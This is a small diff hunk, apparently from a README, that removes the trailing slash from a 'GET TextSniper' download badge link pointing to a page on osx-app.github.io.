@@ -7,7 +7,7 @@
 <br>   
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/textsniper/">  
+<a href="https://osx-app.github.io/.github/textsniper">  
 <img src="https://img.shields.io/badge/🪄_GET_TextSniper-cyan?style=for-the-badge&logo=apple" alt="GET TextSniper">  
 </a>  
 </div>  
